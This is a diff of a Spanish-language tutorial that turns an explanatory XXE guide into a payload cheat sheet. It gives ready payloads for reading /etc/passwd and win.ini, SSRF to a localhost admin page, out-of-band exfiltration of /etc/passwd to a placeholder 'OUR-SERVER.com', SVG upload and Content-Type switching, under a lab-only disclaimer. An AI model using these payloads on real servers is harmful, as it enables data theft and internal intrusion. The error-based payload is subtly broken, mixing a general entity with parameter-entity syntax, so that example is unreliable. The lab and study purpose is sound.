@@ -1,75 +1,94 @@
 
-# Tipos de payloads para XXE (Inyección de Entidad Externa XML)
+# Payloads para XXE (XML External Entity Injection)
 
-En esta guía explicamos los distintos tipos de **payloads XXE** que podemos utilizar, cómo funcionan y en qué escenarios aplicarlos.
+En esta guía recopilamos los **payloads más importantes para explotar XXE**, explicando su uso, objetivo y contexto. Todos estos ejemplos deben probarse únicamente en entornos de laboratorio.
 
 ---
 
-## 1. Recuperación de archivos (File Retrieval)
+## 1. Lectura de archivos locales (File Disclosure)
 
-**¿Qué buscamos?** Acceder al sistema de archivos del servidor y leer archivos sensibles, por ejemplo `/etc/passwd`.
+El payload clásico para leer un archivo del sistema:
 
-**Payload típico:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!DOCTYPE foo [ 
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
 ]>
 <stockCheck>
   <productId>&xxe;</productId>
 </stockCheck>
 ````
 
-* Definimos una entidad externa `xxe` que apunta al archivo deseado.
-* Luego inyectamos `&xxe;` en un campo que el servidor devuelve en la respuesta — obtenemos el contenido del archivo. ([PortSwigger][1])
+* Definimos `xxe` como una entidad que apunta a un archivo local.
+* El servidor reemplaza `&xxe;` por el contenido del archivo.
+
+Otro ejemplo apuntando a un archivo sensible en Windows:
+
+```xml
+<!DOCTYPE foo [ 
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> 
+]>
+<data>&xxe;</data>
+```
 
 ---
 
-## 2. SSRF (Server-Side Request Forgery vía XXE)
+## 2. SSRF mediante XXE
 
-**¿Qué buscamos?** Inducir al servidor que realice una petición HTTP a un recurso interno o externo al que normalmente no podemos acceder.
+Podemos obligar al servidor a realizar peticiones HTTP a recursos internos:
 
-**Payload típico:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ 
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> 
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+</stockCheck>
+```
+
+* Útil para descubrir **servicios internos** o interactuar con APIs.
+
+---
+
+## 3. XXE Ciego con exfiltración Out-of-Band (OOB)
+
+Cuando la respuesta no nos devuelve directamente el resultado, podemos extraer datos enviándolos a un servidor bajo nuestro control.
+
+Ejemplo para filtrar `/etc/passwd` hacia un servidor externo:
 
 ```xml
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OUR-SERVER.com/?data=%file;'>">
+  %eval;
+  %exfil;
 ]>
-<data>
-  &xxe;
-</data>
 ```
 
-* La entidad `xxe` apunta a una URL interna.
-* Si el servidor incluye el contenido de esa entidad en su respuesta, obtenemos dos vías de ataque (respuesta visible y posible interacción adicional). ([PortSwigger][1])
+* `%file` lee `/etc/passwd`.
+* `%eval` construye una nueva entidad.
+* `%exfil` envía el contenido a `OUR-SERVER.com`.
 
 ---
 
-## 3. XXE Ciego (Blind XXE) y Exfiltración Out-of-Band
+## 4. Basado en errores (Error-based XXE)
 
-**¿Qué buscamos?** Extraer datos sin que el servidor nos los devuelva directamente; usar comunicación secundaria hacia un servidor controlado por nosotros.
+Provocamos un fallo que revele datos en el mensaje de error:
 
-**Técnicas comunes:**
-
-* Utilizar una entidad que haga una petición hacia nuestro servidor externo. Podemos detectarlo con una herramienta como Burp Collaborator.
-* Otra variante: provocar errores de parsing XML que filtren datos sensibles en los mensajes de error. ([PortSwigger][1])
-
----
-
-## 4. Recuperación de datos vía errores (Error-based XXE)
-
-**¿Qué buscamos?** Hacer que ocurra un fallo en el análisis XML y que el mensaje de error incluya información sensible.
-
-* Inyectamos entidades que, al fallar, revelan datos a través de la traza de errores.
-* Es una subvariante del XXE ciego, orientada a forzar errores que filtren información. ([PortSwigger][1])
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY fail SYSTEM "file:///does/not/exist/%xxe;">
+]>
+<foo>&fail;</foo>
+```
 
 ---
 
-## 5. XInclude (Inclusión XML)
+## 5. XInclude (cuando no podemos usar DOCTYPE)
 
-**¿Qué buscamos?** Manipular documentos que incorporan fragmentos XML externos mediante la funcionalidad XInclude.
-
-**Payload típico:**
+Algunos entornos bloquean `DOCTYPE`, pero podemos usar XInclude:
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -77,41 +96,60 @@ En esta guía explicamos los distintos tipos de **payloads XXE** que podemos uti
 </foo>
 ```
 
-* Usamos el namespace `xi` y la directiva `xi:include`.
-* Útil cuando no podemos definir un `DOCTYPE`, pero sí podemos inyectar datos en documentos que serán integrados en un XML más grande. ([PortSwigger][1])
+---
+
+## 6. XXE vía subida de archivos
+
+Podemos incrustar payloads en archivos basados en XML, como SVG:
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg height="100" width="100">
+  <text x="10" y="20">&xxe;</text>
+</svg>
+```
+
+Si el servidor procesa el SVG, mostrará el contenido de `/etc/passwd`.
 
 ---
 
-## 6. XXE vía subida de archivos (file upload)
+## 7. Cambio de Content-Type
 
-**¿Qué buscamos?** Aprovechar formatos que contienen XML (como SVG o DOCX) en interfaces de subida de archivos.
+Forzamos a que un endpoint interprete entrada como XML:
 
-* Subimos un archivo SVG malicioso que contiene una entidad XXE.
-* El backend lo procesa y ejecuta el payload, incluso si el usuario no esperaba enviar XML explícitamente. ([PortSwigger][1])
+```
+POST /api HTTP/1.1
+Host: vulnerable.com
+Content-Type: text/xml
 
----
-
-## 7. Cambio de Content-Type (modified content type)
-
-**¿Qué buscamos?** Engañar al servidor para que trate un request como XML cuando normalmente no lo haría.
-
-* Convertimos un formulario normal (`application/x-www-form-urlencoded`) en un body tipo `text/xml`.
-* Si el servidor procesa el XML, podemos inyectar una entidad y explotar XXE, aunque la interfaz no lo soporte abiertamente. ([PortSwigger][1])
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<data>&xxe;</data>
+```
 
 ---
 
-## Resumen comparativo
+## Resumen rápido
 
-| Tipo de Payload              | Objetivo principal                           | Técnica clave                                         |
-| ---------------------------- | -------------------------------------------- | ----------------------------------------------------- |
-| File Retrieval               | Leer archivos desde el servidor              | DOCTYPE + entidad externa → inclusión en respuesta    |
-| SSRF vía XXE                 | Hacer que el servidor acceda a URLs internas | DOCTYPE con URL externa → interacción vía HTTP        |
-| Blind XXE / OOB Exfiltración | Obtener datos indirectamente o por error     | Peticiones a nuestro servidor / errores XML           |
-| Error-based XXE              | Filtrar datos mediante errores XML           | Provocar fallo y capturar mensaje de error            |
-| XInclude                     | Incluir archivos externos sin DOCTYPE        | Etiqueta `xi:include` con href local                  |
-| File upload (SVG, DOCX)      | Entrar via formatos XML embebidos            | Subida de archivo malicioso que el servidor procesará |
-| Modified Content-Type        | Forzar análisis XML en endpoint no XML       | Cambiar tipo de contenido y enviar XML                |
+| Payload / Técnica       | Ejemplo clave                                          | Objetivo principal |
+| ----------------------- | ------------------------------------------------------ | ------------------ |
+| File Disclosure         | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`            | Leer archivos      |
+| SSRF via XXE            | `<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">`        | Pivoting interno   |
+| Blind XXE (OOB)         | `%exfil SYSTEM "http://OUR-SERVER.com/?%file;"`        | Exfiltración       |
+| Error-based XXE         | `<!ENTITY fail SYSTEM "file:///does/not/exist/%xxe;">` | Filtrado por error |
+| XInclude                | `<xi:include href="file:///etc/passwd"/>`              | Sin DOCTYPE        |
+| File upload (SVG, DOCX) | SVG con `&xxe;`                                        | Vía ficheros XML   |
+| Modified Content-Type   | Mandar XML en `text/xml` aunque no se espere           | Forzar parser      |
 
 ---
 
-[1]: https://portswigger.net/web-security/xxe "What is XXE (XML external entity) injection? Tutorial & Examples | Web Security Academy"
+## Conclusión
+
+Estos payloads representan los escenarios más comunes de explotación XXE.
+La práctica en laboratorios como **PortSwigger Academy** es fundamental para afianzar estas técnicas.
+Siempre debemos recordar que en entornos reales, el uso ofensivo sin autorización es ilegal: lo aplicamos solo en entornos de pruebas controladas.
+
+```
